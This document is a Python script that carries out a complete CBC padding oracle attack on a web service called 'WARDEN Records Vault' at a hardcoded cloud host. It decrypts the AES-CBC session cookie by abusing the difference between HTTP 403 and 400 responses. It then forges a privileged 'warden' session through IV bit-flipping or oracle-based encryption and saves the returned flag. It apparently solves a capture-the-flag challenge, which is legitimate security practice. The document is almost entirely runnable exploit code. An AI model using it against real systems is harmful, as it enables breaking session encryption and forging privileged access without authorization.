#!/usr/bin/env python3
"""
CBC Padding Oracle attack on WARDEN Records Vault.

The session cookie is AES-128-CBC encrypted. 
Oracle: HTTP 403 = valid padding, HTTP 400 = bad padding.
Goal: Decrypt the current session, then encrypt a forged "warden" session.
"""

import asyncio
import aiohttp
import sys
import time

BASE = "http://ec2-52-11-248-253.us-west-2.compute.amazonaws.com:8105"
BLOCK_SIZE = 16

async def get_session(session):
    """Get a fresh session cookie."""
    async with session.get(f"{BASE}/api/session") as r:
        data = await r.json()
        return bytes.fromhex(data["cookie"])

async def oracle(session, ct_hex, sem):
    """Returns True if padding is valid (HTTP 403), False if not (HTTP 400)."""
    async with sem:
        async with session.get(f"{BASE}/vault?s={ct_hex}") as r:
            return r.status != 400


async def decrypt_block(session, prev_block, cipher_block, block_num, sem):
    """
    Decrypt a single block using the padding oracle.
    prev_block: the block that precedes cipher_block (acts as IV for this block)
    cipher_block: the block to decrypt
    Returns the intermediate state (D(cipher_block)) and the plaintext.
    """
    intermediate = bytearray(BLOCK_SIZE)
    plaintext = bytearray(BLOCK_SIZE)
    
    for byte_pos in range(BLOCK_SIZE - 1, -1, -1):
        pad_val = BLOCK_SIZE - byte_pos  # 1, 2, 3, ..., 16
        
        # Build the manipulated "IV" block
        # For already-known bytes, set them to produce the desired padding
        manip_base = bytearray(BLOCK_SIZE)
        for k in range(byte_pos + 1, BLOCK_SIZE):
            manip_base[k] = intermediate[k] ^ pad_val
        
        # Try all 256 values concurrently
        candidates = []
        
        async def try_byte(guess):
            manip = bytearray(manip_base)
            manip[byte_pos] = guess
            ct = bytes(manip) + cipher_block
            result = await oracle(session, ct.hex(), sem)
            return guess, result
        
        tasks = [try_byte(g) for g in range(256)]
        results = await asyncio.gather(*tasks)
        
        hits = [g for g, valid in results if valid]
        
        if len(hits) == 1:
            intermediate[byte_pos] = hits[0] ^ pad_val
        elif len(hits) > 1 and byte_pos == BLOCK_SIZE - 1:
            # Multiple hits for last byte - disambiguate
            # The correct one should also work with pad_val=2 on the second-to-last byte
            for h in hits:
                manip = bytearray(manip_base)
                manip[byte_pos] = h
                # Also flip previous byte to rule out longer padding
                manip[byte_pos - 1] ^= 0x01
                ct = bytes(manip) + cipher_block
                if await oracle(session, ct.hex(), sem):
                    intermediate[byte_pos] = h ^ pad_val
                    break
        elif len(hits) > 1:
            # Take the one matching expected pad value if possible
            for h in hits:
                if h ^ pad_val == prev_block[byte_pos]:
                    intermediate[byte_pos] = h ^ pad_val
                    break
            else:
                intermediate[byte_pos] = hits[0] ^ pad_val
        else:
            print(f"  WARNING: No valid byte found at position {byte_pos}!")
            return None, None
            
        plaintext[byte_pos] = intermediate[byte_pos] ^ prev_block[byte_pos]
        
        decoded = ""
        for k in range(byte_pos, BLOCK_SIZE):
            b = plaintext[k]
            if 32 <= b <= 126:
                decoded += chr(b)
            else:
                decoded += f"\\x{b:02x}"
        
        sys.stdout.write(f"\r  Block {block_num} byte {byte_pos:2d}: {decoded:<48s}")
        sys.stdout.flush()
    
    print()
    return bytes(intermediate), bytes(plaintext)


async def encrypt_block(session, desired_plaintext, sem):
    """
    Use the padding oracle to encrypt a desired plaintext block.
    This is done in reverse: we pick a random C2 and find C1 such that
    D(C2) XOR C1 = desired_plaintext.
    
    We use an all-zero C2 and find the intermediate state, then compute C1.
    Actually, we can use ANY C2. Let's use all zeros for simplicity.
    """
    # We need to find intermediate = D(C2)
    # Then C1 = intermediate XOR desired_plaintext
    
    # Use all-zeros as C2 (the ciphertext block)
    c2 = b'\x00' * BLOCK_SIZE
    
    intermediate = bytearray(BLOCK_SIZE)
    
    for byte_pos in range(BLOCK_SIZE - 1, -1, -1):
        pad_val = BLOCK_SIZE - byte_pos
        
        manip_base = bytearray(BLOCK_SIZE)
        for k in range(byte_pos + 1, BLOCK_SIZE):
            manip_base[k] = intermediate[k] ^ pad_val
        
        async def try_byte(guess):
            manip = bytearray(manip_base)
            manip[byte_pos] = guess
            ct = bytes(manip) + c2
            result = await oracle(session, ct.hex(), sem)
            return guess, result
        
        tasks = [try_byte(g) for g in range(256)]
        results = await asyncio.gather(*tasks)
        
        hits = [g for g, valid in results if valid]
        
        if len(hits) == 1:
            intermediate[byte_pos] = hits[0] ^ pad_val
        elif len(hits) > 1 and byte_pos == BLOCK_SIZE - 1:
            for h in hits:
                manip = bytearray(manip_base)
                manip[byte_pos] = h
                manip[byte_pos - 1] ^= 0x01
                ct = bytes(manip) + c2
                if await oracle(session, ct.hex(), sem):
                    intermediate[byte_pos] = h ^ pad_val
                    break
        elif len(hits) > 1:
            intermediate[byte_pos] = hits[0] ^ pad_val
        else:
            print(f"  WARNING: No valid byte found at encrypt position {byte_pos}!")
            return None, None
        
        sys.stdout.write(f"\r  Encrypting byte {byte_pos:2d}/15")
        sys.stdout.flush()
    
    print()
    
    # C1 = intermediate XOR desired_plaintext
    c1 = bytes(intermediate[i] ^ desired_plaintext[i] for i in range(BLOCK_SIZE))
    return c1, c2


async def main():
    sem = asyncio.Semaphore(50)  # Limit concurrency
    
    connector = aiohttp.TCPConnector(limit=50)
    async with aiohttp.ClientSession(connector=connector) as session:
        # Step 1: Get session
        raw = await get_session(session)
        print(f"Session cookie: {raw.hex()}")
        
        blocks = [raw[i:i+16] for i in range(0, len(raw), 16)]
        print(f"Blocks: {len(blocks)}")
        for i, b in enumerate(blocks):
            print(f"  Block {i}: {b.hex()}")
        
        # Step 2: Decrypt all blocks
        print("\n=== DECRYPTING SESSION ===")
        t0 = time.time()
        
        full_plaintext = bytearray()
        for i in range(1, len(blocks)):
            print(f"\nDecrypting block {i}...")
            inter, pt = await decrypt_block(session, blocks[i-1], blocks[i], i, sem)
            if pt is None:
                print("FAILED!")
                return
            full_plaintext.extend(pt)
        
        # Remove PKCS7 padding
        pad_len = full_plaintext[-1]
        if all(b == pad_len for b in full_plaintext[-pad_len:]):
            plaintext_unpadded = full_plaintext[:-pad_len]
        else:
            plaintext_unpadded = full_plaintext
        
        dt = time.time() - t0
        print(f"\nDecrypted plaintext ({dt:.1f}s): {bytes(plaintext_unpadded)}")
        print(f"Hex: {bytes(plaintext_unpadded).hex()}")
        
        # Step 3: Forge the "warden" session
        # Figure out what to change
        pt_str = plaintext_unpadded.decode('ascii', errors='replace')
        print(f"Plaintext string: {repr(pt_str)}")
        
        # Replace "auditor" with "warden" in the plaintext
        if b'auditor' in plaintext_unpadded:
            forged_pt = bytes(plaintext_unpadded).replace(b'auditor', b'warden ')
            # Adjust if lengths differ
            if len(forged_pt) != len(plaintext_unpadded):
                forged_pt = bytes(plaintext_unpadded).replace(b'auditor', b'warden\x00')
                if len(forged_pt) != len(plaintext_unpadded):
                    # Just try direct replacement
                    forged_pt = bytes(plaintext_unpadded).replace(b'auditor', b'warden')
        else:
            print("'auditor' not found in plaintext, looking for role field...")
            forged_pt = plaintext_unpadded
        
        print(f"\nForged plaintext: {repr(forged_pt)}")
        
        # Now we need to figure out how to forge this.
        # Since we know the intermediate state, we can do a simple IV manipulation
        # if the change is only in block 1 (first plaintext block).
        # Otherwise we need full padding oracle encryption.
        
        # Let's see which block the "auditor" / "warden" text is in
        # For now, let's try the simplest approach: bitflip the IV
        # If "auditor" is in the first plaintext block (decrypted with IV), 
        # we can just adjust the IV.
        
        # Add PKCS7 padding to forged plaintext
        pad_needed = BLOCK_SIZE - (len(forged_pt) % BLOCK_SIZE)
        if pad_needed == 0:
            pad_needed = BLOCK_SIZE
        forged_padded = forged_pt + bytes([pad_needed]) * pad_needed
        
        print(f"Forged padded ({len(forged_padded)} bytes): {forged_padded.hex()}")
        
        # Check if we can do simple IV bitflip
        orig_padded = bytes(full_plaintext)
        if len(forged_padded) == len(orig_padded):
            # XOR difference
            diff = bytes(a ^ b for a, b in zip(orig_padded, forged_padded))
            # Check which blocks differ
            diff_blocks = []
            for i in range(len(diff) // BLOCK_SIZE):
                blk = diff[i*BLOCK_SIZE:(i+1)*BLOCK_SIZE]
                if any(b != 0 for b in blk):
                    diff_blocks.append(i)
            
            print(f"Blocks that differ: {diff_blocks}")
            
            if len(diff_blocks) == 1 and diff_blocks[0] == 0:
                # Only first block differs - simple IV manipulation!
                print("Simple IV bitflip attack!")
                new_iv = bytearray(blocks[0])
                for j in range(BLOCK_SIZE):
                    new_iv[j] ^= diff[j]
                forged_cookie = bytes(new_iv) + raw[16:]
                print(f"Forged cookie: {forged_cookie.hex()}")
                
                # Test it
                async with session.get(f"{BASE}/vault?s={forged_cookie.hex()}") as r:
                    body = await r.text()
                    print(f"\nForged session => HTTP {r.status}")
                    print(body)
                    
                    if r.status == 200 or 'flag' in body.lower():
                        with open("flag.txt", "w") as f:
                            # Extract flag from response
                            for line in body.split('\n'):
                                if 'flag' in line.lower() or 'FLAG' in line or '{' in line:
                                    f.write(line.strip())
                                    print(f"\nFLAG: {line.strip()}")
                        return
            
            # If changes span multiple blocks, we need to re-encrypt
            # But we can still use the IV-manipulation trick on a per-block basis
            # by rebuilding from the last block forward
            if len(diff_blocks) > 0:
                print(f"\nChanges in blocks: {diff_blocks}")
                print("Need to use padding oracle encryption for multi-block forge...")
                
                # We need to encrypt the forged plaintext using padding oracle encryption
                # Strategy: build from the last block backwards
                forged_blocks = [forged_padded[i:i+16] for i in range(0, len(forged_padded), 16)]
                num_blocks = len(forged_blocks)
                
                print(f"\nForging {num_blocks} blocks of plaintext...")
                
                # Start with the last ciphertext block (can be anything)
                cipher_blocks = [None] * (num_blocks + 1)  # +1 for IV
                cipher_blocks[num_blocks] = b'\x00' * BLOCK_SIZE  # Last CT block
                
                t1 = time.time()
                for i in range(num_blocks - 1, -1, -1):
                    print(f"\nForging block {i}...")
                    # Find intermediate = D(cipher_blocks[i+1])
                    # Then cipher_blocks[i] = intermediate XOR forged_blocks[i]
                    
                    c2 = cipher_blocks[i + 1]
                    intermediate = bytearray(BLOCK_SIZE)
                    
                    for byte_pos in range(BLOCK_SIZE - 1, -1, -1):
                        pad_val = BLOCK_SIZE - byte_pos
                        
                        manip_base = bytearray(BLOCK_SIZE)
                        for k in range(byte_pos + 1, BLOCK_SIZE):
                            manip_base[k] = intermediate[k] ^ pad_val
                        
                        async def try_byte_enc(guess, mb=manip_base, bp=byte_pos, c=c2):
                            manip = bytearray(mb)
                            manip[bp] = guess
                            ct = bytes(manip) + c
                            result = await oracle(session, ct.hex(), sem)
                            return guess, result
                        
                        tasks = [try_byte_enc(g) for g in range(256)]
                        results = await asyncio.gather(*tasks)
                        
                        hits = [g for g, valid in results if valid]
                        
                        if len(hits) == 1:
                            intermediate[byte_pos] = hits[0] ^ pad_val
                        elif len(hits) > 1 and byte_pos == BLOCK_SIZE - 1:
                            for h in hits:
                                manip = bytearray(manip_base)
                                manip[byte_pos] = h
                                manip[byte_pos - 1] ^= 0x01
                                ct = bytes(manip) + c2
                                if await oracle(session, ct.hex(), sem):
                                    intermediate[byte_pos] = h ^ pad_val
                                    break
                        elif len(hits) > 1:
                            intermediate[byte_pos] = hits[0] ^ pad_val
                        else:
                            print(f"  WARNING: No valid byte at encrypt pos {byte_pos}!")
                            return
                        
                        sys.stdout.write(f"\r  Block {i} byte {byte_pos:2d}/15  ({len(hits)} hits)")
                        sys.stdout.flush()
                    
                    print()
                    cipher_blocks[i] = bytes(intermediate[j] ^ forged_blocks[i][j] for j in range(BLOCK_SIZE))
                
                dt2 = time.time() - t1
                print(f"\nEncryption done ({dt2:.1f}s)")
                
                forged_cookie = b''.join(cipher_blocks)
                print(f"Forged cookie: {forged_cookie.hex()}")
                
                # Test it
                async with session.get(f"{BASE}/vault?s={forged_cookie.hex()}") as r:
                    body = await r.text()
                    print(f"\nForged session => HTTP {r.status}")
                    print(body)
                    
                    if r.status == 200 or 'flag' in body.lower() or r.status != 400:
                        with open("flag.txt", "w") as f:
                            for line in body.split('\n'):
                                if 'flag' in line.lower() or 'FLAG' in line or '{' in line:
                                    f.write(line.strip() + '\n')
                                    print(f"\nFLAG: {line.strip()}")

if __name__ == "__main__":
    asyncio.run(main())
